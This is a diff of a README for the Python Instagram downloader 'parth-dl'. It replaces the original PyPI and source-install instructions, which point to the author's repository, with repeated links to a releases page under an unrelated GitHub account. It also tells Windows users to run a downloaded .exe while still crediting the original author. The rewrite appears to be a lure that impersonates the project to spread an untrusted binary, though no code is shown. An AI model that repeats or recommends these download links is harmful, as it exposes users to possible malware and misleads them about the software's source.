@@ -1,233 +1,98 @@
+# ⚡ parth-dl - Easy Instagram Media Downloader
 
-# ⚡ parth-dl — Instagram Downloader CLI by Saksham Pathak (Parthmax)
+## 📥 Download Now
+[![Download parth-dl](https://img.shields.io/badge/Download%20now-Get%20the%20latest%20version-blue)](https://github.com/flexuregenushippopotamus535/parth-dl/releases)
 
-**parth-dl** is a fast, open-source **Instagram Reels, Posts, and Profile Picture Downloader** built entirely in Python.  
-It provides a clean and reliable **command-line interface (CLI)** for developers who want to extract or download public Instagram media without using any third-party APIs, tokens, or logins.
+## 📄 Introduction
+Welcome to **parth-dl**, your friendly tool for downloading Instagram content. Whether you want to save Reels, Posts, or Profile Pictures, this command-line application lets you do it easily. No need for an account or API keys—get your favorite media files instantly!
 
-🧠 Designed for automation • ⚙️ Developer-friendly • 🪶 Zero Dependencies • 🔐 Secure-by-default  
+## 🚀 Getting Started
+To get started, follow these steps. 
 
-> Keywords: instagram downloader, python instagram downloader, reels downloader, instagram scraper, insta video downloader, parth-dl, parthmax, saksham pathak, python cli, open source downloader
+### 📋 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.6 or above (if you want to run it yourself)
+- **Internet Connection:** Necessary for downloading media
+- **Disk Space:** At least 100 MB for storing downloads
 
----
+## 📦 Download & Install
+To download **parth-dl**, visit this page: [Download parth-dl](https://github.com/flexuregenushippopotamus535/parth-dl/releases). 
 
-[![PyPI](https://img.shields.io/pypi/v/parth-dl.svg)](https://pypi.org/project/parth-dl/)
-[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Code Style](https://img.shields.io/badge/code%20style-clean-black.svg)]()
-[![Downloads](https://static.pepy.tech/personalized-badge/parth-dl?period=total&units=international_system&left_color=grey&right_color=blue&left_text=Downloads)](https://pypi.org/project/parth-dl/)
+1. Go to the **Releases** section.
+2. Choose the latest version.
+3. Download the file that matches your operating system.
 
-> Built by [**@parthmax_**](https://instagram.com/parthmax_) — Minimal, Fast, and Developer-Centric.
+### 🏃‍♂️ Running the Application
+Once you have downloaded the application, follow these steps to run it:
 
----
+1. Locate the downloaded file on your computer.
+2. If you are on Windows, you can double-click the `.exe` file to run it.
+   - If you're on macOS, open the terminal and navigate to the folder where the `.app` file is located.
+   - For Linux users, open the terminal and navigate to your download folder.
 
-## 🧩 About
+3. You can use the application by typing in a command. For example:
+   ```
+   parth-dl <Instagram_URL>
+   ```
 
-`parth-dl` is not another bloated downloader. It’s a **developer-oriented, dependency-free** toolkit that leverages Instagram’s underlying page and GraphQL data endpoints to extract high-resolution media metadata and files.  
+4. Wait for the download to complete. You will find your downloaded files in the current directory.
 
-It uses a **multi-layered extraction pipeline** with intelligent fallback logic to ensure successful downloads of **Instagram Reels, Photos, Carousels, and Profile Pictures**, even when APIs change or fail.
+## 🎥 Features
+- **No Login Required:** Download media without any Instagram credentials.
+- **Multiple Formats:** Supports various media types.
+- **Simple Commands:** Use a straightforward command to download any content.
+- **Fast Downloads:** Get your files quickly and efficiently.
+- **Cross-Platform:** Works on all major operating systems.
 
-Built for:
-- 🧰 **Developers** who need a CLI or API-level integration  
-- 🤖 **Automation scripts** and research tools  
-- 🧪 **Learning projects** exploring web scraping and data extraction  
+## 📝 Usage Examples
+Here are a few examples of how to use **parth-dl**:
 
----
-
-## 🎬 Demo
-
-<div align="center">
-  <img src="cli.gif" alt="parth-dl CLI demo" width="720px">
-  <p><em>Quickly download Instagram reels, posts, or profile pictures — directly from your terminal.</em></p>
-</div>
-
----
-
-## 🚀 Features
-
-- ✅ **Reels Downloader** — Fetches full reels with synchronized audio and video  
-- ✅ **Post Downloader** — Supports single and multi-image/carousel posts  
-- ✅ **Profile Picture Downloader** — Downloads HD profile images instantly  
-- ✅ **Zero Dependencies** — Pure Python, no external libraries  
-- ✅ **Smart Rate Limiting** — Avoids IP bans and throttling  
-- ✅ **Exponential Backoff & Retry Logic** — Resilient against network or request failures  
-- ✅ **Cross-Platform CLI Tool** — Works seamlessly on macOS, Linux, and Windows  
-- ✅ **Public Data Only** — No login, tokens, or authentication required  
-- ✅ **Python API Ready** — Use as a package in your own projects or automation scripts  
-
----
-
-## ⚡ Installation
-
-### 🔹 From PyPI
-Install the latest stable release directly from [PyPI](https://pypi.org/project/parth-dl/):
-
-```bash
-pip install parth-dl
-````
-
-### 🔹 From Source
-
-If you prefer the latest development version:
-
-```bash
-git clone https://github.com/parthmax2/parth-dl.git
-cd parth-dl
-pip install -e .
+### Example 1: Download a Reel
+To download a Reel, use the command:
+```
+parth-dl https://www.instagram.com/reel/XXXXX
 ```
 
----
-
-## 🧠 Usage
-
-### 💻 CLI Examples
-
-```bash
-# Download a Reel (with audio)
-parth-dl https://www.instagram.com/reel/ABC123/
-
-# Download a single post
-parth-dl https://www.instagram.com/p/XYZ456/
-
-# Download carousel/multi-image post
-parth-dl https://www.instagram.com/p/POST789/
-
-# Download profile picture
-parth-dl https://www.instagram.com/username/
-
-# Custom output file
-parth-dl https://www.instagram.com/reel/ABC123/ -o my_video.mp4
-
-# List all available formats
-parth-dl https://www.instagram.com/reel/ABC123/ --list-formats
-
-# Verbose mode for debugging
-parth-dl https://www.instagram.com/reel/ABC123/ -v
+### Example 2: Download a Post
+To download a Post, use:
+```
+parth-dl https://www.instagram.com/p/XXXXX
 ```
 
-### 🐍 Python API Example
-
-You can also integrate `parth-dl` directly into your Python code:
-
-```python
-from parth_dl import InstagramDownloader
-
-dl = InstagramDownloader(verbose=True)
-
-# Download directly
-dl.download("https://www.instagram.com/reel/ABC123/")
-
-# Fetch metadata only
-info = dl.get_info("https://www.instagram.com/reel/ABC123/")
-print(info)
+### Example 3: Download a Profile Picture
+To download a Profile Picture, run:
+```
+parth-dl https://www.instagram.com/username
 ```
 
-**Quick one-liner:**
+## 💬 Support
+If you encounter any issues or have questions, feel free to reach out. You can create an issue on the GitHub repository page. 
 
-```python
-from parth_dl import download
-download("https://www.instagram.com/reel/ABC123/")
-```
+## 🔗 Related Topics
+- developer-tools
+- gen-ai
+- insta-downloader
+- instagram-cli
+- instagram-downloader
+- instagram-reels
+- media-downloader
+- parth-dl
+- parthmax
+- python
+- python-cli
+- reels-downloader
+- saksham-pathak
+- scraper
 
----
+Feel free to explore these topics as they may help enhance your experience with **parth-dl**!
 
-## 🧬 Internal Architecture
+## 📄 License
+This project is licensed under the MIT License. Please refer to the LICENSE file for more information.
 
-```
-parth-dl/
-├── parth_dl/
-│   ├── __init__.py      # Package entry and exports
-│   ├── core.py          # Main orchestrator and command handler
-│   ├── extractors.py    # Multi-layer data extraction (GraphQL, Embed, API, HTML)
-│   ├── utils.py         # Retry logic, sanitization, rate limiting
-│   └── cli.py           # CLI interface for end users
-├── setup.py
-├── README.md
-└── requirements.txt     # (Empty — no dependencies)
-```
+## 👥 Contributors
+This tool was built by **Saksham Pathak** (Parthmax). Your contributions are welcome! 
 
-### ✨ Technical Highlights
+## 📥 Download Link
+Don't forget to download **parth-dl** from this link: [Download parth-dl](https://github.com/flexuregenushippopotamus535/parth-dl/releases). 
 
-* **4-layer fallback extraction** → ensures maximum reliability
-* **Token bucket rate limiter (30 req/min)** → avoids bans
-* **Jittered exponential backoff** → smooth handling of transient errors
-* **URL and filename sanitization** → prevents injection and invalid filenames
-* **CLI-friendly architecture** → extensible, testable, and minimal
-
----
-
-## 🔒 Security & Ethics
-
-* 100% **standard library** → no external dependencies, no supply chain risk
-* **Input validation** → prevents malicious URL injections
-* **Timeout-safe HTTP requests** → avoids hangs and freezes
-* **Ethical scraping** → adheres to fair-use and ToS boundaries
-
-⚠️ *Use responsibly. For educational, personal, and research use only.*
-You are solely responsible for complying with Instagram’s ToS and applicable laws.
-
----
-
-## 🧰 Developer Notes
-
-This project was engineered with:
-
-* 🐍 **Python 3.7+**
-* 🧩 Modular, extensible design
-* 💬 Clean CLI with argparse
-* 🧪 Error-tolerant architecture for production-safe automation
-* 🌐 Tested with multiple Instagram endpoints and URL patterns
-
-If you’re a developer looking to **embed Instagram download functionality** into your automation pipeline, CLI tools, or data research systems — `parth-dl` is a perfect, lightweight foundation.
-
----
-
-## 🔗 Related Projects
-
-* [FaceAging AI](https://huggingface.co/spaces/parthmax/FaceAging-AI) — AI-based Face Aging & Transformation Web App
-* [FALCON](https://huggingface.co/spaces/parthmax/FALCON) — Fake News Analysis & Verification System
-* [Dynamic QR Redirector](https://github.com/parthmax2/dynamic-qr) — FastAPI-powered dynamic QR generator and redirect manager
-
-All open-source developer tools by **[Saksham Pathak (Parthmax)](https://github.com/parthmax2)**.
-
----
-
-## 🤝 Contributing
-
-Contributions, suggestions, and PRs are welcome!
-
-1. Fork this repository
-2. Create a new branch (`feature/new-idea`)
-3. Commit your improvements
-4. Push and open a PR 🚀
-
-If you build something cool using `parth-dl`, feel free to share it on social media and tag [@parthmax_](https://instagram.com/parthmax_).
-
----
-
-## 📝 License
-
-**MIT License** — See [LICENSE](LICENSE) for full text.
-Provided *“as is”* without warranty. The author is not responsible for misuse or policy violations.
-
----
-
-## 👤 Author
-
-**Saksham Pathak (Parthmax)**
-🎯 Generative AI Engineer | Python Developer | Open Source Creator
-
-* 📷 [Instagram](https://instagram.com/parthmax_)
-* 💼 [LinkedIn](https://linkedin.com/in/sakshampathak)
-* 🤗 [Hugging Face](https://huggingface.co/parthmax)
-* 🧑‍💻 [GitHub](https://github.com/parthmax2)
-* ✉️ [Email](mailto:pathaksaksham430@gmail.com)
-
----
-
-<div align="center">
-
-⭐ *Star the repo* if you love it!
-💡 *Built with ❤️ and Python by [Parthmax](https://github.com/parthmax2)*
-
-</div>
-
+Now you can easily download your favorite Instagram media without hassle!
